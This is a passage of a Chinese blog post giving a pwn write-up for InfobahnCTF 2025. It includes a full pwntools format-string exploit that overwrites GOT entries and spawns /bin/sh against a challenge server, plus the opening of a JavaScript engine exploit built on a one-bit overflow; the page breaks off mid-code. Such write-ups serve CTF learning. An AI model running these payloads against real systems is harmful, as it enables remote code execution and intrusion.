<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>Infobahn2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="Infobahn2025 Writeup | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/InfobahnCTF-2025-Pwn-Writeup/"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt/><span>README.mdx</span></a><div class="file-meta"><span>25.7 KiB</span><span class="file-meta-date">2025-11-10 14:30</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="infobahnctf2025-pwn-writeup" class="scroll-target"><a href="#infobahnctf2025-pwn-writeup"><code class="hash inline-code">#</code>InfobahnCTF2025 Pwn Writeup</a></h1>
<p><img src="https://pic1.imgdb.cn/item/691187013203f7be00ed1b7c.png" alt="ak"/></p>
<p><del>难道他真是赋能哥</del></p>
<h2 id="pwnset" class="scroll-target"><a href="#pwnset"><code class="hash inline-code">#</code>pwnset</a></h2>
<p>子进程里有一个白给的格式化字符串，思路是 strtoll -> system，然后 free -> strtoll。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">context</span><span style="color:#2993a3">(</span><span style="color:#B07D48">arch</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> os</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">linux</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> log_level</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">info</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">tmux splitw -h -l 65</span><span style="color:#A65E2B">% -b</span><span style="color:#B5695977">"</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">kitten @ launch --location=before --cwd=current --bias=65</span><span style="color:#B5695977">"</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><br><span style="color:#393A34">local </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">ip </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">pwnset.challs.infobahnc.tf</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">port </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1337</span><br><span style="color:#A65E2B">ELF_PATH</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">./chal</span><span style="color:#B5695977">"</span><br><br><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">ELF_PATH</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># libc = ELF("./libc.so.6")</span><br><span style="color:#393A34">script </span><span style="color:#999999">=</span><span style="color:#B5695977"> '''</span><br><span style="color:#B56959">file ./chal</span><br><span style="color:#B56959">set follow-fork-mode child</span><br><span style="color:#B56959">catch exec</span><br><span style="color:#B56959">b syslog</span><br><span style="color:#B56959">b system</span><br><span style="color:#B56959">go</span><br><span style="color:#B5695977">'''</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> start</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#A65E2B">GDB</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#2993a3">(</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#999999">,</span><span style="color:#B07D48"> gdbscript</span><span style="color:#999999"> =</span><span style="color:#393A34"> script</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    elif</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#A65E2B">REMOTE</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#393A34">ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> dbg</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> local</span><span style="color:#999999">:</span><br><span style="color:#393A34">        gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#999999">,</span><span style="color:#393A34">script</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> lg</span><span style="color:#2993a3">(</span><span style="color:#393A34">buf</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'</span><span style="color:#A65E2B">\033</span><span style="color:#B56959">[33m</span><span style="color:#1e754f">{</span><span style="color:#393A34">buf</span><span style="color:#1e754f">}</span><span style="color:#B56959">:</span><span style="color:#1e754f">{</span><span style="color:#998418">eval</span><span style="color:#a65e2b">(</span><span style="color:#393A34">buf</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">:#x</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\033</span><span style="color:#B56959">[0m'</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">'</span><span style="color:#A65E2B">\'</span><span style="color:#B56959">;/bin/sh;</span><span style="color:#A65E2B">\'</span><span style="color:#B56959">%</span><span style="color:#2993a3">{</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">8750</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">d</span><span style="color:#AB5959">-</span><span style="color:#2F798A">11</span><span style="color:#2993a3">}</span><span style="color:#B56959">c%142$hn%</span><span style="color:#2993a3">{</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">401200</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">8750</span><span style="color:#2993a3">}</span><span style="color:#B56959">c%20$n'</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">28</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">403458</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#999999">:</span><span style="color:#2F798A">3</span><span style="color:#2993a3">]</span><span style="color:rgba(255, 18, 18, 0.8)">)</span><br><br><span style="color:#393A34">pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">100</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">4207784</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Select</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> in</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvrepeat</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0.2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        break</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">arch</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> os</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">linux</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> log_level</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">tmux splitw -h -l 65</span><span style="color:#C99076">% -b</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">kitten @ launch --location=before --cwd=current --bias=65</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#DBD7CAEE">local </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">ip </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">pwnset.challs.infobahnc.tf</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">port </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1337</span><br><span style="color:#C99076">ELF_PATH</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./chal</span><span style="color:#C98A7D77">"</span><br><br><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C99076">ELF_PATH</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># libc = ELF("./libc.so.6")</span><br><span style="color:#DBD7CAEE">script </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '''</span><br><span style="color:#C98A7D">file ./chal</span><br><span style="color:#C98A7D">set follow-fork-mode child</span><br><span style="color:#C98A7D">catch exec</span><br><span style="color:#C98A7D">b syslog</span><br><span style="color:#C98A7D">b system</span><br><span style="color:#C98A7D">go</span><br><span style="color:#C98A7D77">'''</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> start</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#C99076">GDB</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">,</span><span style="color:#BD976A"> gdbscript</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> script</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#C99076">REMOTE</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    else</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> start</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> dbg</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> local</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">script</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> lg</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'</span><span style="color:#C99076">\033</span><span style="color:#C98A7D">[33m</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">buf</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#B8A965">eval</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#d4976c">)</span><span style="color:#CB7676">:#x</span><span style="color:#4d9375">}</span><span style="color:#C99076">\033</span><span style="color:#C98A7D">[0m'</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">'</span><span style="color:#C99076">\'</span><span style="color:#C98A7D">;/bin/sh;</span><span style="color:#C99076">\'</span><span style="color:#C98A7D">%</span><span style="color:#5eaab5">{</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">8750</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">d</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">11</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">c%142$hn%</span><span style="color:#5eaab5">{</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">401200</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">8750</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">c%20$n'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">28</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">403458</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">:</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">]</span><span style="color:rgba(255, 18, 18, 0.8)">)</span><br><br><span style="color:#DBD7CAEE">pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">100</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">4207784</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Select</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvrepeat</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0.2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    else</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        break</span><br><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>1/16 爆破，远程需要一点耐心（<del>说的就是你daimi</del>）</p>
<h2 id="book-manager-v2" class="scroll-target"><a href="#book-manager-v2"><code class="hash inline-code">#</code>book manager v2</a></h2>
<p>任意读写原语，随便打。</p>
<h2 id="the-butterfly-effect" class="scroll-target"><a href="#the-butterfly-effect"><code class="hash inline-code">#</code>The Butterfly effect</a></h2>
<p><code class="inline-code">magic</code> 方法存在一个 off by one 漏洞，可以溢出翻转一个 64 位数字的某个二进制位，但是只能用一次。</p>
<p>感觉不太能翻转 <code class="inline-code">map</code>，通过翻转 <code class="inline-code">len</code> 字段构造一个无限溢出的 <code class="inline-code">double array</code>。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#A0ADA0">/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> conversion_buffer</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> ArrayBuffer</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> float_view</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Float64Array</span><span style="color:#2993a3">(</span><span style="color:#B07D48">conversion_buffer</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> int_view</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> BigUint64Array</span><span style="color:#2993a3">(</span><span style="color:#B07D48">conversion_buffer</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#998418">BigInt</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#1E754F">    return</span><span style="color:#B5695977"> '</span><span style="color:#B56959">0x</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> +</span><span style="color:#A65E2B"> this</span><span style="color:#999999">.</span><span style="color:#59873A">toString</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br><br><span style="color:#998418">BigInt</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    int_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#A65E2B"> this</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> float_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#998418">BigInt</span><span style="color:#999999">.</span><span style="color:#998418">prototype</span><span style="color:#999999">.</span><span style="color:#59873A">smi2f</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    int_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#A65E2B"> this</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> float_view</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#998418">Number</span><span style="color:#999999">.</span><span 